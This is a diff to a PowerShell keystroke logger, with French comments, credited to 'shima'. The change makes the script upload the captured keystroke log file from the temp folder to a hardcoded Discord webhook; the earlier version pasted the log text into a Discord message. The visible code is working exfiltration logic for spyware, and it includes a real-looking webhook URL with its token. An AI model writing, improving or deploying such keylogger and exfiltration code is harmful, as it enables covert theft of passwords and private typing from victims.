@@ -1,6 +1,6 @@
 <#
 PowerShell keystroke logger by shima
-Modifié : arrêt automatique + webhook Discord
+Modifié : arrêt automatique + envoi fichier Discord
 #>
 
 function KeyLog {
@@ -78,38 +78,26 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
-# 📍 Afficher le fichier log après l'arrêt
+# 🚀 Lancer le keylogger
 KeyLog
+
+# 📁 Envoyer le fichier sur Discord
 $logfile = "$env:temp\key.log"
-Write-Host "`n📄 Contenu du fichier log :" -ForegroundColor Yellow
-Write-Host "Fichier sauvegardé à : $logfile" -ForegroundColor Cyan
+$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
+
+Write-Host "`n📤 Envoi du fichier sur Discord..." -ForegroundColor Yellow
 
 if (Test-Path $logfile) {
-    $contenu = Get-Content $logfile -Raw
-    Write-Host $contenu
-    
-    # 📍 WEBHOOK DISCORD - VERSION CORRIGÉE
-    Start-Sleep -Seconds 2
-    
-    $webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
-    
-    # 📍 Découper le contenu si > 2000 caractères (limite Discord)
-    if ($contenu.Length -gt 2000) {
-        $contenu = $contenu.Substring(0, 1997) + "..."
-    }
-    
-    # 📍 Format Discord correct
-    $body = @{
-        content = "🔐 **KEYLOG ENREGISTRÉ** 🔐`n`n" + $contenu
-    } | ConvertTo-Json
-    
     try {
-        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
-        Write-Host "`n✅ Message envoyé à Discord !" -ForegroundColor Green
+        # Envoyer le fichier directement
+        Invoke-RestMethod -Uri $webhook -Method Post -Form @{
+            "payload_json" = @{content = "🔐 Keylog enregistré"} | ConvertTo-Json
+            "file" = Get-Item $logfile
+        }
+        Write-Host "✅ Fichier envoyé avec succès !" -ForegroundColor Green
     } catch {
-        Write-Host "`n❌ Erreur lors de l'envoi : $_" -ForegroundColor Red
+        Write-Host "❌ Erreur : $_" -ForegroundColor Red
     }
-    
 } else {
-    Write-Host "Aucune touche enregistrée." -ForegroundColor Gray
+    Write-Host "❌ Fichier non trouvé" -ForegroundColor Red
 }
